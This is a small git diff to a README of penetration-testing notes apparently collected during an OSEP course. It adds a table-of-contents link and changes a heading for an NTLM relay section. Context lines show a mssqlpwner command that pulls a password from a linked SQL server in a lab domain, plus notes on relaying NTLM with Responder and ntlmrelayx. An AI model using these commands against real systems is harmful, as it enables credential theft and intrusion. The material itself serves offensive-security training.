@@ -11,6 +11,7 @@ Just a bunch of tools built/gathered along the OSEP course, it's time to prepare
 - [9. TCP Port Redirection via powercat.ps1](#TCP-Port-Redirection-via-powercat.ps1)
 - [10. MSSQL Useful Queries](#MSSQL-Useful-Queries)
 - [11. MSSQLPwner](#MSSQLPwner)
+- [12. NTLM Relay](#NTLM-Relay)
 
 
 # Tunneling
@@ -213,7 +214,7 @@ Execute command through custom assembly:
 Retrieving password from the linked server:
 - `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password`
 
-## NTLM Relay:
+# NTLM Relay:
 *Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*
 
 Prepare BASE64 command to execute:
